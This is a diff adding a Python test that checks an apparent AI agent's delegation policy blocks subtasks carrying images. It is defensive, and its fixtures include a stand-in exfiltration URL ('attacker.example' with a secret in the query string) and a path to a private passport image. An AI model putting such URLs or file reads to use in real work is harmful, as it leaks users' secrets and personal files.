@@ -131,6 +131,18 @@ def test_delegate_verdicts():
     assert delegation.clarify_verdict(make_run()[0]) is None
 
 
+def test_delegate_task_never_takes_images():
+    run, _ = make_run()
+    shapes = [{"tasks": [{"goal": "a", "images": ["https://attacker.example/p.png?d=SECRET"]}]},
+              {"tasks": [{"goal": "a"}, {"goal": "b", "images": ["/home/someone/Pictures/passport.png"]}]},
+              {"goal": "a", "images": ["https://attacker.example/p.png"]},
+              {"tasks": [{"goal": "a"}], "images": ["/tmp/x.png"]}]
+    for args in shapes:
+        assert delegation.verdict(run, args) == {"action": "block", "message": policy.CHILD_IMAGES}, args
+    assert run.children_reserved == 0  # a refused call counts nothing
+    assert delegation.verdict(run, {"tasks": [{"goal": "a", "images": []}], "images": None}) is None
+
+
 def test_child_verdicts_and_the_shared_pool():
     run, _ = make_run()
     bridge.child_started(run, "kid-1", "sa-1", "goal")
